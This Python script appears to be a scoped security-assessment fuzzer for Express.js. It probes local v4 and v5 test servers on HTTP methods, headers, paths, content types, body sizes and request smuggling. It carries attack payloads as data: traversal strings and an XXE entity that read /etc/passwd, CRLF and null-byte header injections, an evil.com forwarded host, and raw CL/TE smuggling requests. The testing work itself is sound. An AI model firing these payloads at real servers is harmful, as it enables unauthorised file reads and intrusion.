#!/usr/bin/env python3
"""
Phase 2.1 — HTTP Route Fuzzer
Express.js Security Assessment — [REDACTED]

Tests Express framework HTTP handling: method routing, header parsing,
content-type negotiation, path normalization, payload limits.
SCOPE: Framework behavior only.
"""

import requests
import json
import os
import time
from datetime import datetime

TARGETS = {'v5': 'http://127.0.0.1:3000', 'v4': 'http://127.0.0.1:3001'}
EVIDENCE_DIR = '/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/evidence'

results = {
    'metadata': {
        'phase': '2.1', 'name': 'HTTP Route Fuzzer',
        'timestamp': datetime.now().isoformat(),
        'scope': 'Framework HTTP handling behavior'
    },
    'tests': [], 'findings': [], 'anomalies': [], 'summary': {}
}

test_count = 0
anomaly_count = 0

def log_test(name, version, data, finding=None, anomaly=None):
    global test_count, anomaly_count
    test_count += 1
    entry = {'id': test_count, 'test': name, 'version': version, 'data': data}
    if finding:
        results['findings'].append({'id': len(results['findings'])+1, **finding, 'version': version})
        print(f"  [{test_count:3d}] ⚠ FINDING {name} ({version})")
    elif anomaly:
        anomaly_count += 1
        results['anomalies'].append({'id': anomaly_count, 'test': name, 'version': version, **anomaly})
        print(f"  [{test_count:3d}] ? ANOMALY {name} ({version})")
    else:
        print(f"  [{test_count:3d}] ✓ {name} ({version})")
    results['tests'].append(entry)


# Routes to test
ROUTES = ['/health', '/api/users', '/search', '/method-test', '/greet',
          '/auth/protected', '/admin/dashboard', '/error-test']

def fuzz_methods():
    """Test HTTP method handling across routes"""
    print("\n[*] Fuzzing HTTP methods...")
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE',
               'CONNECT', 'PROPFIND', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK',
               'FAKEMETH', 'get', 'GeT']  # Case variations

    for version, base_url in TARGETS.items():
        for route in ['/health', '/method-test', '/api/users']:
            for method in methods:
                try:
                    r = requests.request(method, f'{base_url}{route}', timeout=5)
                    finding = None
                    anomaly = None

                    # TRACE should be disabled
                    if method == 'TRACE' and r.status_code == 200:
                        finding = {
                            'title': 'HTTP TRACE Method Accepted',
                            'severity': 'LOW', 'cwe': 'CWE-693',
                            'description': f'Express accepts TRACE on {route}',
                            'framework_behavior': True
                        }
                    # Case-insensitive methods
                    elif method in ('get', 'GeT') and r.status_code == 200:
                        anomaly = {'desc': f'Case-insensitive method {method} accepted on {route}'}

                    log_test(f'method_{method}_{route}', version,
                             {'status': r.status_code, 'content_length': len(r.content)},
                             finding, anomaly)
                except Exception as e:
                    log_test(f'method_{method}_{route}', version, {'error': str(e)})


def fuzz_headers():
    """Test framework header parsing"""
    print("\n[*] Fuzzing headers...")

    header_payloads = [
        ('oversized_host', {'Host': 'A' * 50000}),
        ('newline_host', {'Host': 'a.com\r\nX-Inject: evil'}),
        ('null_host', {'Host': 'a.com\x00evil.com'}),
        ('empty_host', {'Host': ''}),
        ('xff_single', {'X-Forwarded-For': '[REDACTED-INTERNAL-IP]'}),
        ('xff_chain', {'X-Forwarded-For': '[REDACTED-INTERNAL-IP], [REDACTED-INTERNAL-IP], [REDACTED-INTERNAL-IP]'}),
        ('xfh_override', {'X-Forwarded-Host': 'evil.com'}),
        ('xfp_https', {'X-Forwarded-Proto': 'https'}),
        ('duplicate_content_type', {'Content-Type': 'application/json'}),
        ('huge_header_value', {'X-Custom': 'B' * 100000}),
        ('many_headers', {f'X-Header-{i}': f'value-{i}' for i in range(100)}),
        ('transfer_encoding_chunked', {'Transfer-Encoding': 'chunked'}),
        ('te_cl_conflict', {'Transfer-Encoding': 'chunked', 'Content-Length': '0'}),
        ('double_te', {'Transfer-Encoding': 'chunked, identity'}),
        ('te_weird_case', {'Transfer-Encoding': 'cHuNkEd'}),
        ('connection_up[REDACTED]', {'Connection': 'Up[REDACTED]', 'Up[REDACTED]': 'websocket'}),
    ]

    for version, base_url in TARGETS.items():
        for test_name, headers in header_payloads:
            try:
                r = requests.get(f'{base_url}/method-test', headers=headers, timeout=5)
                anomaly = None
                if r.status_code >= 500:
                    anomaly = {'desc': f'Server error with {test_name}: {r.status_code}'}

                log_test(f'header_{test_name}', version,
                         {'status': r.status_code, 'response_size': len(r.content)},
                         anomaly=anomaly)
            except requests.exceptions.ConnectionError:
                log_test(f'header_{test_name}', version,
                         {'error': 'Connection refused/reset'},
                         anomaly={'desc': f'Connection error with {test_name}'})
            except Exception as e:
                log_test(f'header_{test_name}', version, {'error': str(e)})


def fuzz_paths():
    """Test Express path parsing and normalization"""
    print("\n[*] Fuzzing URL paths...")

    path_payloads = [
        ('double_slash', '//health'),
        ('triple_slash', '///health'),
        ('backslash', '/health\\..\\env-test'),
        ('encoded_dot', '/%2e%2e/env-test'),
        ('double_encoded_dot', '/%252e%252e/env-test'),
        ('null_byte', '/health%00'),
        ('null_in_path', '/health%00.json'),
        ('overlong_utf8', '/%c0%ae%c0%ae/env-test'),
        ('unicode_homoglyph', '/\u0068ealth'),  # h with Latin h
        ('tab_in_path', '/health%09'),
        ('space_in_path', '/health%20'),
        ('semicolon_param', '/health;id=1'),
        ('hash_in_path', '/health%23fragment'),
        ('very_long_path', '/' + 'a' * 10000),
        ('deeply_nested', '/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p'),
        ('dots_traversal', '/static/../../../etc/passwd'),
        ('encoded_traversal', '/static/..%2f..%2f..%2fetc%2fpasswd'),
        ('double_encoded_traversal', '/static/..%252f..%252f..%252fetc%252fpasswd'),
        ('backslash_traversal', '/static/..\\..\\..\\etc\\passwd'),
        ('mixed_slashes', '/static/..%5c..%5c..%5cetc%5cpasswd'),
    ]

    for version, base_url in TARGETS.items():
        for test_name, path in path_payloads:
            try:
                r = requests.get(f'{base_url}{path}', timeout=5, allow_redirects=False)
                finding = None
                anomaly = None

                # Check for path traversal success
                body = r.text
                if 'root:' in body or '/bin/bash' in body:
                    finding = {
                        'title': f'Path Traversal via {test_name}',
                        'severity': 'CRITICAL', 'cwe': 'CWE-22',
                        'description': f'Path traversal successful with payload: {path}',
                        'framework_behavior': True
                    }
                elif r.status_code == 200 and 'traversal' in test_name:
                    anomaly = {'desc': f'{test_name} returned 200: {body[:100]}'}

                log_test(f'path_{test_name}', version,
                         {'path': path[:200], 'status': r.status_code,
                          'content_length': len(r.content), 'body_snippet': body[:200]},
                         finding, anomaly)
            except Exception as e:
                log_test(f'path_{test_name}', version, {'path': path[:200], 'error': str(e)})


def fuzz_content_types():
    """Test Content-Type handling in body parsers"""
    print("\n[*] Fuzzing Content-Type handling...")

    ct_payloads = [
        ('json_normal', 'application/json', '{"key":"value"}'),
        ('json_charset', 'application/json; charset=utf-8', '{"key":"value"}'),
        ('json_utf7', 'application/json; charset=utf-7', '{"key":"value"}'),
        ('json_uppercase', 'APPLICATION/JSON', '{"key":"value"}'),
        ('urlenc_normal', 'application/x-www-form-urlencoded', 'key=value'),
        ('text_plain', 'text/plain', '{"key":"value"}'),
        ('xml', 'application/xml', '<?xml version="1.0"?><root><key>val</key></root>'),
        ('xxe', 'application/xml', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
        ('multipart_no_file', 'multipart/form-data; boundary=----Boundary', '------Boundary\r\nContent-Disposition: form-data; name="key"\r\n\r\nvalue\r\n------Boundary--'),
        ('empty_content_type', '', '{"key":"value"}'),
        ('null_in_ct', 'application/json\x00text/html', '{"key":"value"}'),
        ('very_long_ct', 'application/json; ' + 'a' * 10000, '{"key":"value"}'),
    ]

    for version, base_url in TARGETS.items():
        for test_name, ct, body in ct_payloads:
            try:
                headers = {'Content-Type': ct} if ct else {}
                r = requests.post(f'{base_url}/method-test', data=body.encode(),
                                  headers=headers, timeout=5)
                log_test(f'ct_{test_name}', version,
                         {'content_type': ct[:100], 'status': r.status_code,
                          'body_parsed': str(r.json().get('body', {}))[:200] if r.status_code == 200 else r.text[:200]})
            except Exception as e:
                log_test(f'ct_{test_name}', version, {'error': str(e)})


def fuzz_payload_sizes():
    """Test body parser size limits"""
    print("\n[*] Fuzzing payload sizes...")

    sizes = [
        ('10kb', 10 * 1024),
        ('100kb', 100 * 1024),
        ('101kb', 101 * 1024),  # Just over default 100kb limit
        ('1mb', 1024 * 1024),
        ('10mb', 10 * 1024 * 1024),
    ]

    for version, base_url in TARGETS.items():
        for size_name, size in sizes:
            try:
                payload = json.dumps({'data': 'A' * size})
                r = requests.post(f'{base_url}/method-test',
                                  data=payload,
                                  headers={'Content-Type': 'application/json'},
                                  timeout=15)

                finding = None
                if r.status_code == 200 and size > 100 * 1024:
                    finding = {
                        'title': f'body-parser Accepted {size_name} Payload (Over Default Limit)',
                        'severity': 'LOW', 'cwe': 'CWE-400',
                        'description': f'body-parser accepted {size_name} payload. '
                                       f'Default limit is 100kb but may be configurable.',
                        'framework_behavior': True
                    }

                log_test(f'size_{size_name}', version,
                         {'sent_bytes': len(payload), 'status': r.status_code},
                         finding)
            except Exception as e:
                log_test(f'size_{size_name}', version, {'sent_bytes': size, 'error': str(e)})


def fuzz_request_smuggling():
    """Basic HTTP smuggling probes against Node.js HTTP parser"""
    print("\n[*] Testing HTTP request smuggling surface...")
    import socket

    smuggling_payloads = [
        ('cl_te_basic', b'POST /method-test HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX'),
        ('te_cl_basic', b'POST /method-test HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n1\r\nA\r\n0\r\n\r\n'),
        ('te_space', b'POST /method-test HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding : chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX'),
        ('te_newline', b'POST /method-test HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding:\r\n chunked\r\n\r\n0\r\n\r\n'),
        ('double_cl', b'POST /method-test HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 6\r\nContent-Length: 0\r\n\r\n{}\r\n\r\n'),
    ]

    for version, base_url in TARGETS.items():
        port = int(base_url.split(':')[-1])
        for test_name, payload in smuggling_payloads:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect(('127.0.0.1', port))
                sock.send(payload)
                response = sock.recv(4096)
                sock.close()

                status_line = response.split(b'\r\n')[0].decode() if response else 'NO RESPONSE'

                anomaly = None
                if b'200 OK' in response and test_name in ('cl_te_basic', 'te_cl_basic'):
                    anomaly = {'desc': f'Smuggling probe {test_name} got 200 OK — needs investigation'}

                log_test(f'smuggle_{test_name}', version,
                         {'status_line': status_line, 'response_size': len(response)},
                         anomaly=anomaly)
            except Exception as e:
                log_test(f'smuggle_{test_name}', version, {'error': str(e)})


def main():
    print("=" * 70)
    print("Phase 2.1 — HTTP Route Fuzzer")
    print("Express.js Security Assessment — Framework HTTP Handling")
    print("=" * 70)

    fuzz_methods()
    fuzz_headers()
    fuzz_paths()
    fuzz_content_types()
    fuzz_payload_sizes()
    fuzz_request_smuggling()

    results['summary'] = {
        'total_tests': test_count,
        'findings_count': len(results['findings']),
        'anomalies_count': anomaly_count,
        'findings_by_severity': {}
    }
    for f in results['findings']:
        sev = f.get('severity', 'UNKNOWN')
        results['summary']['findings_by_severity'][sev] = \
            results['summary']['findings_by_severity'].get(sev, 0) + 1

    out_file = os.path.join(EVIDENCE_DIR, 'http_fuzzer_results.json')
    with open(out_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)

    print(f"\n{'=' * 70}")
    print(f"HTTP fuzzer complete: {test_count} tests, {len(results['findings'])} findings, {anomaly_count} anomalies")
    for sev, count in results['summary']['findings_by_severity'].items():
        print(f"  {sev}: {count}")
    print(f"Evidence: {out_file}")
    print(f"{'=' * 70}")


if __name__ == '__main__':
    main()
